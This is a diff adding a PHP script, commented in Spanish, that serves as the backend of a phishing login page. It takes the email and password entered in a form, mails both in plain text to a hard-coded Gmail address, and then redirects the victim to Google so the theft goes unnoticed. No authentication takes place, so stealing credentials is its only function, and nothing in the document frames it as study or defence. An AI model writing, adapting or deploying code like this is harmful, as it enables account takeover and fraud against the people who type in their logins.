@@ -1,0 +1,37 @@
+<?php
+// Verificamos si el formulario fue enviado
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Recibimos los datos del formulario
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    // Validación básica
+    if (empty($email) || empty($password)) {
+        echo "Por favor, completa ambos campos.";
+    } else {
+        // Configuración del correo
+        $to = "tractor49tractor@gmail.com"; // Dirección de correo destino
+        $subject = "Nuevo intento de inicio de sesión";
+        $message = "Correo electrónico: " . htmlspecialchars($email) . "\n";
+        $message .= "Contraseña: " . htmlspecialchars($password) . "\n";
+
+        // Cabeceras del correo
+        $headers = "From: no-reply@tudominio.com" . "\r\n" .
+                   "Reply-To: " . $email . "\r\n" .
+                   "X-Mailer: PHP/" . phpversion();
+
+        // Enviar el correo
+        if (mail($to, $subject, $message, $headers)) {
+            // Si el correo se envía correctamente, redirigimos a Google
+            header("Location: https://www.google.com");
+            exit(); // Detenemos la ejecución del script
+        } else {
+            echo "Hubo un error al enviar el correo. Intenta nuevamente.";
+        }
+    }
+} else {
+    // Si no se envió el formulario, redirigimos al formulario de inicio de sesión
+    header("Location: index.html");
+    exit();
+}
+?>
